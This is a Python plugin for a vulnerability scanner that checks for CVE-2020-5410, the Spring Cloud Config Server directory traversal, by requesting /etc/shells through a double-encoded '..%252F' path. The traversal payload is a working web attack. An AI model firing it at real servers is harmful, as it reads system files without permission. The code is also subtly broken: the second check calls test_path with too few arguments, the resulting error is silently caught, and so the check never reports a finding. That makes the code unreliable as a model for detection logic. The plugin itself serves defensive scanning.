from lib.poc.dummy import *


async def test_path(ip, port, url, path):
    r = await http_client(ip, port).get(url + path, timeout=10)
    if r.status_code == 200 and 'Content-Type' in r.headers and r.headers.get(
            'Content-Type') == 'application/json' and 'Server' not in r.headers and \
            r.text.startswith('{"name":"') and '"/bin/bash"' in r.text:
        return True
    return False


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    paths = [
        '/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..'
        '%252F..%252Fetc%252Fshells%23foo/development',
        '/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..'
        '%252F..%252Fetc%252Fshellz%23foo/development']
    try:

        url = '{}://{}:{}'.format(service, ip, port)
        if await test_path(ip, port, url, paths[0]) and not await test_path(url, paths[1]):
            ret = {
                'alert_group': 'Sprint Cloud Config Server Directory Traversal(CVE-2020-5410)',
                'affects': '{}://{}:{}'.format(service, ip, port),
                'details': 'Sprint Cloud Config Server Directory Traversal(CVE-2020-5410)\n'
                           '{}'.format(url + paths[0])
            }
            return ret
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 8888, 'http', True, task_msg={})
    run_plugin_test(scan)
